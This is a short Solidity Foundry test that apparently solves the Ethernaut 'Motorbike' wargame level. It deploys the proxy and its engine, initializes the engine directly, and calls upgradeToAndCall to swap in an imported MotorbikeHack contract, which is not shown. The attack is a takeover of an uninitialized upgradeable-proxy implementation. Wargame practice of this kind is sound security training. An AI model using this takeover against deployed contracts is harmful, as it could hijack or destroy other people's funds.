// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/Test.sol";
import "../src/Motorbike.sol";
import "../src/MotorbikeHack.sol";

contract MotorbikeTest is Test {
    Engine engine;
    Motorbike motorbike;
    MotorbikeHack hack;
    Engine ethernautEngine;

    function setUp() public {
        engine = new Engine();
        motorbike = new Motorbike(address(engine));
        ethernautEngine = Engine(payable(address(motorbike)));

        hack = new MotorbikeHack();

        engine.initialize();
    }

    function testHack() public {
        bytes memory data = abi.encodeWithSignature("initialize()");

        engine.upgradeToAndCall(address(hack), data);
    }
}
